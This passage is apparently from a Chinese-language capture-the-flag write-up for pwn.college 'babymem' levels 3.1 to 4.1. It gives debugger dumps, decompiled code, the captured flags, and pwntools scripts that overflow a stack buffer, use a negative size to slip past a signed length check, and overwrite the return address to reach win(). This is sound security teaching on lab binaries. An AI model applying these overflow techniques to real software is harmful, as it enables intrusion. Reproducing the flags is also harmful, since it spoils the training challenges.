```asm wrap=false ins="0x0000000000401a0b" collapse={2-21, 29-30, 36-90, 109-128, 133-162} {131}
pwndbg> i fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  write@plt
0x0000000000401130  printf@plt
0x0000000000401140  geteuid@plt
0x0000000000401150  read@plt
0x0000000000401160  setvbuf@plt
0x0000000000401170  open@plt
0x0000000000401180  __isoc99_scanf@plt
0x0000000000401190  exit@plt
0x00000000004011a0  strerror@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  bin_padding
0x0000000000401a0b  win
0x0000000000401b12  challenge
0x0000000000401c64  main
0x0000000000401d40  __libc_csu_init
0x0000000000401db0  __libc_csu_fini
0x0000000000401db8  _fini
pwndbg> disass challenge
Dump of assembler code for function challenge:
   0x0000000000401b12 <+0>: endbr64
   0x0000000000401b16 <+4>: push   rbp
   0x0000000000401b17 <+5>: mov    rbp,rsp
   0x0000000000401b1a <+8>: sub    rsp,0xb0
   0x0000000000401b21 <+15>: mov    DWORD PTR [rbp-0x94],edi
   0x0000000000401b27 <+21>: mov    QWORD PTR [rbp-0xa0],rsi
   0x0000000000401b2e <+28>: mov    QWORD PTR [rbp-0xa8],rdx
   0x0000000000401b35 <+35>: mov    QWORD PTR [rbp-0x80],0x0
   0x0000000000401b3d <+43>: mov    QWORD PTR [rbp-0x78],0x0
   0x0000000000401b45 <+51>: mov    QWORD PTR [rbp-0x70],0x0
   0x0000000000401b4d <+59>: mov    QWORD PTR [rbp-0x68],0x0
   0x0000000000401b55 <+67>: mov    QWORD PTR [rbp-0x60],0x0
   0x0000000000401b5d <+75>: mov    QWORD PTR [rbp-0x58],0x0
   0x0000000000401b65 <+83>: mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000401b6d <+91>: mov    QWORD PTR [rbp-0x48],0x0
   0x0000000000401b75 <+99>: mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000401b7d <+107>: mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000401b85 <+115>: mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000401b8d <+123>: mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000401b95 <+131>: mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000401b9d <+139>: mov    DWORD PTR [rbp-0x18],0x0
   0x0000000000401ba4 <+146>: mov    WORD PTR [rbp-0x14],0x0
   0x0000000000401baa <+152>: lea    rax,[rbp-0x80]
   0x0000000000401bae <+156>: mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401bb2 <+160>: mov    QWORD PTR [rbp-0x88],0x0
   0x0000000000401bbd <+171>: lea    rdi,[rip+0x548]        # 0x40210c
   0x0000000000401bc4 <+178>: mov    eax,0x0
   0x0000000000401bc9 <+183>: call   0x401130 <printf@plt>
   0x0000000000401bce <+188>: lea    rax,[rbp-0x88]
   0x0000000000401bd5 <+195>: mov    rsi,rax
   0x0000000000401bd8 <+198>: lea    rdi,[rip+0x53c]        # 0x40211b
   0x0000000000401bdf <+205>: mov    eax,0x0
   0x0000000000401be4 <+210>: call   0x401180 <__isoc99_scanf@plt>
   0x0000000000401be9 <+215>: mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000401bf0 <+222>: mov    rsi,rax
   0x0000000000401bf3 <+225>: lea    rdi,[rip+0x526]        # 0x402120
   0x0000000000401bfa <+232>: mov    eax,0x0
   0x0000000000401bff <+237>: call   0x401130 <printf@plt>
   0x0000000000401c04 <+242>: mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000401c0b <+249>: mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401c0f <+253>: mov    rsi,rax
   0x0000000000401c12 <+256>: mov    edi,0x0
   0x0000000000401c17 <+261>: call   0x401150 <read@plt>
   0x0000000000401c1c <+266>: mov    DWORD PTR [rbp-0xc],eax
   0x0000000000401c1f <+269>: cmp    DWORD PTR [rbp-0xc],0x0
   0x0000000000401c23 <+273>: jns    0x401c51 <challenge+319>
   0x0000000000401c25 <+275>: call   0x401100 <__errno_location@plt>
   0x0000000000401c2a <+280>: mov    eax,DWORD PTR [rax]
   0x0000000000401c2c <+282>: mov    edi,eax
   0x0000000000401c2e <+284>: call   0x4011a0 <strerror@plt>
   0x0000000000401c33 <+289>: mov    rsi,rax
   0x0000000000401c36 <+292>: lea    rdi,[rip+0x50b]        # 0x402148
   0x0000000000401c3d <+299>: mov    eax,0x0
   0x0000000000401c42 <+304>: call   0x401130 <printf@plt>
   0x0000000000401c47 <+309>: mov    edi,0x1
   0x0000000000401c4c <+314>: call   0x401190 <exit@plt>
   0x0000000000401c51 <+319>: lea    rdi,[rip+0x514]        # 0x40216c
   0x0000000000401c58 <+326>: call   0x401110 <puts@plt>
   0x0000000000401c5d <+331>: mov    eax,0x0
   0x0000000000401c62 <+336>: leave
   0x0000000000401c63 <+337>: ret
End of assembler dump.
pwndbg> b *challenge+261
Breakpoint 1 at 0x401c17
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-3-1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-3-1!
###

Payload size: 1771
Send your payload (up to 1771 bytes)!

Breakpoint 1, 0x0000000000401c17 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fffffffd130 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-3-1'
 RCX  0
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd130 ◂— 0
 R8   0x75
 R9   0xfffffffc
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x7fffffffd1b0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd100 ◂— 0xa /* '\n' */
 RIP  0x401c17 (challenge+261) ◂— call 0x401150
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x401c17 <challenge+261>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7fffffffd130 ◂— 0
        nbytes: 0x6eb

   0x401c1c <challenge+266>    mov    dword ptr [rbp - 0xc], eax
   0x401c1f <challenge+269>    cmp    dword ptr [rbp - 0xc], 0
   0x401c23 <challenge+273>    jns    challenge+319               <challenge+319>

   0x401c25 <challenge+275>    call   __errno_location@plt        <__errno_location@plt>

   0x401c2a <challenge+280>    mov    eax, dword ptr [rax]
   0x401c2c <challenge+282>    mov    edi, eax
   0x401c2e <challenge+284>    call   strerror@plt                <strerror@plt>

   0x401c33 <challenge+289>    mov    rsi, rax
   0x401c36 <challenge+292>    lea    rdi, [rip + 0x50b]     RDI => 0x402148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x401c3d <challenge+299>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fffffffd100 ◂— 0xa /* '\n' */
01:0008│-0a8     0x7fffffffd108 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-0a0     0x7fffffffd110 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-3-1'
03:0018│-098     0x7fffffffd118 ◂— 0x100000000
04:0020│-090     0x7fffffffd120 —▸ 0x7fffffffd140 ◂— 0
05:0028│-088     0x7fffffffd128 ◂— 0x6eb
06:0030│ rax rsi 0x7fffffffd130 ◂— 0
07:0038│-078     0x7fffffffd138 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401c17 challenge+261
   1         0x401d2a main+198
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4         0x4011de _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i frame
Stack level 0, frame at 0x7fffffffd1c0:
 rip = 0x401c17 in challenge; saved rip = 0x401d2a
 called by frame at 0x7fffffffe1f0
 Arglist at 0x7fffffffd1b0, args:
 Locals at 0x7fffffffd1b0, Previous frame's sp is 0x7fffffffd1c0
 Saved registers:
  rbp at 0x7fffffffd1b0, rip at 0x7fffffffd1b8
pwndbg> distance 0x7fffffffd130 0x7fffffffd1b8
0x7fffffffd130->0x7fffffffd1b8 is 0x88 bytes (0x11 words)
```

很显然这是想让我们覆盖返回地址控制程序执行流程，达到执行 `win` 的目的。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-3-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x88, b"A") + p64(0x401A0B)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{k2xNTDjO8L-Rt_oy5sU-i2dFj1y.0FN5IDL5cTNxgzW}`

### Level 4.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

#### Write-up

```c {7, 55} ins={60-64} del={85} collapse={1-3, 11-51, 68-81, 89-108}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-B0h] BYREF
  int v7; // [rsp+1Ch] [rbp-94h]
  size_t nbytes[15]; // [rsp+2Ch] [rbp-84h] BYREF
  int v9; // [rsp+A4h] [rbp-Ch]
  void *buf; // [rsp+A8h] [rbp-8h]
  __int64 savedregs; // [rsp+B0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+B8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  buf = (char *)nbytes + 4;
  memset(nbytes, 0, 110);
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 106);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)buf + 8,
    106);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 106);
  puts("and 8 that will overwrite the return address).\n");
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the canary is disabled, otherwise you would corrupt it before");
  puts("overwriting the return address, and the program would abort.");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  printf("Payload size: ");
  __isoc99_scanf("%i", nbytes);
  puts("This challenge is more careful: it will check to make sure you");
  puts("don't want to provide so much data that the input buffer will");
  puts("overflow. But recall twos compliment, look at how the check is");
  puts("implemented, and try to beat it!");
  if ( SLODWORD(nbytes[0]) > 106 )
  {
    puts("Provided size is too large!");
    exit(1);
  }
  puts("You made it past the check! Because the read() call will interpret");
  puts("your size differently than the check above, the resulting read will");
  puts("be unstable and might fail. You will likely have to try this several");
  puts("times before your input is actually read.");
  printf("You have chosen to send %i bytes of input!\n", LODWORD(nbytes[0]));
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + SLODWORD(nbytes[0]),
    LODWORD(nbytes[0]) - 106);
  printf("Of these, you will overwrite %d bytes into the return address.\n", (_DWORD)buf + LODWORD(nbytes[0]) - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("You will want to overwrite the return value from challenge()");
  printf("(located at %p, %d bytes past the start of the input buffer)\n", (const void *)rp_, rp_ - (_DWORD)buf);
  printf("with %p, which is the address of the win() function.\n", win);
  puts("This will cause challenge() to return directly into the win() function,");
  puts("which will in turn give you the flag.");
  puts("Keep in mind that you will need to write the address of the win() function");
  puts("in little-endian (bytes backwards) so that it is interpreted properly.\n");
  printf("Send your payload (up to %i bytes)!\n", LODWORD(nbytes[0]));
  v9 = read(0, buf, LODWORD(nbytes[0]));
  if ( v9 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v9);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the address of win() is %p.\n", win);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win() when it returns.");
  printf("Let's try it now!\n\n");
  puts("Goodbye!");
  return 0LL;
}
```

```c
// ...

if ( SLODWORD(nbytes[0]) > 106 )
{
  puts("Provided size is too large!");
  exit(1);
}
```

`SLODWORD(nbytes[0]) > 106` 则退出程序。但是我们的 payload 为 144 bytes（提示信息中已经说明了 payload 长度），因此显然不能在 payload size 中直接输入 144。

为了绕过这一点，我们注意到 `nbytes` 的类型为 `size_t`：

```c del="size_t"
// ...

size_t nbytes[15]; // [rsp+2Ch] [rbp-84h] BYREF
```

因为 `size_t` 是无符号整形，所以如果我们提供一个负数，它将会被隐式地转换为无符号数。

根据补码规则我们知道，`-1` 会被表示成 `0xffffffff`，如果把它看作无符号数，这无疑是相当大的一个数字。

又因为程序使用 `SLODWORD` 来判断，这是获取一个有符号数的低 `DWORD`。

那么如果我们输入 `-1` ，则程序最后执行 `SLODWORD(nbytes[0]) > 106` 时判断的会是 `0xffffffff` 和 `106` 的大小。很显然前者小于后者，成功绕过了这个 `if` 判断。

而由于有符号数被隐式转换为无符号数保存在了 `nbytes` 中，故我们获得了一个相当大的输入范围。

正好 `read` 获取用户输入的时候也把最大输入大小视作无符号数，毕竟输入大小显然不可能为负数。但这也为我们的攻击带来了可能：

```c del="LODWORD(nbytes[0])"
// ...

v9 = read(0, buf, LODWORD(nbytes[0]));
```

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-4-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x88, b"A") + p64(0x4020F3)

target.recvuntil(b"Payload size: ")
target.sendline(b"-1")
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{YWYtWHsecMbA0xSnI1_Yfj-kjlB.0VN5IDL5cTNxgzW}`

### Level 4.1

#### Information

- Category: Pwn

#### Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

#### Write-up

```c ins={13-17} del={19} collapse={1-9, 23-29}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes[7]; // [rsp+2Ch] [rbp-44h] BYREF
  int v4; // [rsp+64h] [rbp-Ch]
  void *buf; // [rsp+68h] [rbp-8h]

  buf = (char *)nbytes + 4;
  memset(nbytes, 0, 50);
  printf("Payload size: ");
  __isoc99_scanf("%i", nbytes);
  if ( SLODWORD(nbytes[0]) > 46 )
  {
    puts("Provided size is too large!");
    exit(1);
  }
  printf("Send your payload (up to %i bytes)!\n", LODWORD(nbytes[0]));
  v4 = read(0, buf, LODWORD(nbytes[0]));
  if ( v4 < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  puts("Goodbye!");
  return 0LL;
}
```

和上一题思路相同，都是通过有符号数隐式转换为无符号数绕过 payload 长度判断，然后覆盖返回地址。几乎没区别，这里就不再赘述分析过程了。

```asm wrap=false showLineNumbers=false ins="0x0000000000401704" collapse={2-21, 29-30, 36-90, 109-128, 133-162}
pwndbg> i fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  write@plt
0x0000000000401130  printf@plt
0x0000000000401140  geteuid@plt
0x0000000000401150  read@plt
0x0000000000401160  setvbuf@plt
0x0000000000401170  open@plt
0x0000000000401180  __isoc99_scanf@plt
0x0000000000401190  exit@plt
0x00000000004011a0  strerror@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  bin_padding
0x0000000000401704  win
0x000000000040180b  challenge
0x0000000000401921  main
0x0000000000401a00  __libc_csu_init
0x0000000000401a70  __libc_csu_fini
0x0000000000401a78  _fini
pwndbg> disass challenge
Dump of assembler code for function challenge:
   0x000000000040180b <+0>: endbr64
   0x000000000040180f <+4>: push   rbp
   0x0000000000401810 <+5>: mov    rbp,rsp
   0x0000000000401813 <+8>: sub    rsp,0x70
   0x0000000000401817 <+12>: mov    DWORD PTR [rbp-0x54],edi
   0x000000000040181a <+15>: mov    QWORD PTR [rbp-0x60],rsi
   0x000000000040181e <+19>: mov    QWORD PTR [rbp-0x68],rdx
   0x0000000000401822 <+23>: mov    QWORD PTR [rbp-0x40],0x0
   0x000000000040182a <+31>: mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000401832 <+39>: mov    QWORD PTR [rbp-0x30],0x0
   0x000000000040183a <+47>: mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000401842 <+55>: mov    QWORD PTR [rbp-0x20],0x0
   0x000000000040184a <+63>: mov    DWORD PTR [rbp-0x18],0x0
   0x0000000000401851 <+70>: mov    WORD PTR [rbp-0x14],0x0
   0x0000000000401857 <+76>: lea    rax,[rbp-0x40]
   0x000000000040185b <+80>: mov    QWORD PTR [rbp-0x8],rax
   0x000000000040185f <+84>: mov    DWORD PTR [rbp-0x44],0x0
   0x0000000000401866 <+91>: lea    rdi,[rip+0x89f]        # 0x40210c
   0x000000000040186d <+98>: mov    eax,0x0
   0x0000000000401872 <+103>: call   0x401130 <printf@plt>
   0x0000000000401877 <+108>: lea    rax,[rbp-0x44]
   0x000000000040187b <+112>: mov    rsi,rax
   0x000000000040187e <+115>: lea    rdi,[rip+0x896]        # 0x40211b
   0x0000000000401885 <+122>: mov    eax,0x0
   0x000000000040188a <+127>: call   0x401180 <__isoc99_scanf@plt>
   0x000000000040188f <+132>: mov    eax,DWORD PTR [rbp-0x44]
   0x0000000000401892 <+135>: cmp    eax,0x2e
   0x0000000000401895 <+138>: jle    0x4018ad <challenge+162>
   0x0000000000401897 <+140>: lea    rdi,[rip+0x880]        # 0x40211e
   0x000000000040189e <+147>: call   0x401110 <puts@plt>
   0x00000000004018a3 <+152>: mov    edi,0x1
   0x00000000004018a8 <+157>: call   0x401190 <exit@plt>
   0x00000000004018ad <+162>: mov    eax,DWORD PTR [rbp-0x44]
   0x00000000004018b0 <+165>: mov    esi,eax
   0x00000000004018b2 <+167>: lea    rdi,[rip+0x887]        # 0x402140
   0x00000000004018b9 <+174>: mov    eax,0x0
   0x00000000004018be <+179>: call   0x401130 <printf@plt>
   0x00000000004018c3 <+184>: mov    eax,DWORD PTR [rbp-0x44]
   0x00000000004018c6 <+187>: mov    edx,eax
   0x00000000004018c8 <+189>: mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004018cc <+193>: mov    rsi,rax
   0x00000000004018cf <+196>: mov    edi,0x0
   0x00000000004018d4 <+201>: call   0x401150 <read@plt>
   0x00000000004018d9 <+206>: mov    DWORD PTR [rbp-0xc],eax
   0x00000000004018dc <+209>: cmp    DWORD PTR [rbp-0xc],0x0
   0x00000000004018e0 <+213>: jns    0x40190e <challenge+259>
   0x00000000004018e2 <+215>: call   0x401100 <__errno_location@plt>
   0x00000000004018e7 <+220>: mov    eax,DWORD PTR [rax]
   0x00000000004018e9 <+222>: mov    edi,eax
   0x00000000004018eb <+224>: call   0x4011a0 <strerror@plt>
   0x00000000004018f0 <+229>: mov    rsi,rax
   0x00000000004018f3 <+232>: lea    rdi,[rip+0x86e]        # 0x402168
   0x00000000004018fa <+239>: mov    eax,0x0
   0x00000000004018ff <+244>: call   0x401130 <printf@plt>
   0x0000000000401904 <+249>: mov    edi,0x1
   0x0000000000401909 <+254>: call   0x401190 <exit@plt>
   0x000000000040190e <+259>: lea    rdi,[rip+0x877]        # 0x40218c
   0x0000000000401915 <+266>: call   0x401110 <puts@plt>
   0x000000000040191a <+271>: mov    eax,0x0
   0x000000000040191f <+276>: leave
   0x0000000000401920 <+277>: ret
End of assembler dump.
pwndbg> b *challenge+201
Breakpoint 1 at 0x4018d4
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-4-1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-4-1!
###

Payload size: 16
Send your payload (up to 16 bytes)!

Breakpoint 1, 0x00000000004018d4 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────
 RAX  0x7fffffffd170 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-4-1'
 RCX  0
 RDX  0x10
 RDI  0
 RSI  0x7fffffffd170 ◂— 0
 R8   0x69
 R9   0xfffffffe
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x7fffffffd1b0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x7fffffffd170 ◂— 0
 RIP  0x4018d4 (challenge+201) ◂— call 0x401150
────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────
 ► 0x4018d4 <challenge+201>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7fffffffd170 ◂— 0
        nbytes: 0x10

   0x4018d9 <challenge+206>    mov    dword ptr [rbp - 0xc], eax
   0x4018dc <challenge+209>    cmp    dword ptr [rbp - 0xc], 0
   0x4018e0 <challenge+213>    jns    challenge+259               <challenge+259>

   0x4018e2 <challenge+215>    call   __errno_location@plt        <__errno_location@plt>

   0x4018e7 <challenge+220>    mov    eax, dword ptr [rax]
   0x4018e9 <challenge+222>    mov    edi, eax
   0x4018eb <challenge+224>    call   strerror@plt                <strerror@plt>

   0x4018f0 <challenge+229>    mov    rsi, rax
   0x4018f3 <challenge+232>    lea    rdi, [rip + 0x86e]     RDI => 0x402168 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x4018fa <challenge+239>    mov    eax, 0                 EAX => 0
──────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ rsp     0x7fffffffd140 —▸ 0x7fffffffd170 ◂— 0
01:0008│-068     0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-060     0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-4-1'
03:0018│-058     0x7fffffffd158 ◂— 0x10000000a /* '\n' */
04:0020│-050     0x7fffffffd160 —▸ 0x7ffff7f8d5c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-048     0x7fffffffd168 ◂— 0x1000404020 /* ' @@' */
06:0030│ rax rsi 0x7fffffffd170 ◂— 0
07:0038│-038     0x7fffffffd178 ◂— 0
────────────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► 0         0x4018d4 challenge+201
   1         0x4019e7 main+198
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4         0x4011de _start+46
─────────────────────────────────────────────────────────────────────────────────────
pwndbg> i frame
Stack level 0, frame at 0x7fffffffd1c0:
 rip = 0x4018d4 in challenge; saved rip = 0x4019e7
 called by frame at 0x7fffffffe1f0
 Arglist at 0x7fffffffd1b0, args:
 Locals at 0x7fffffffd1b0, Previous frame's sp is 0x7fffffffd1c0
 Saved registers:
  rbp at 0x7fffffffd1b0, rip at 0x7fffffffd1b8
pwndbg> distance 0x7fffffffd170 0x7fffffffd1b8
0x7fffffffd170->0x7fffffffd1b8 is 0x48 bytes (0x9 words)
```

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-4-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x48, b"A") + p64(0x401704)

target.recvuntil(b"Payload size: ")
target.sendline(b"-1")
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{M-FCJzqtx7cmDX7yqpyi7jADAMM.0lN5IDL5cTNxgzW}`
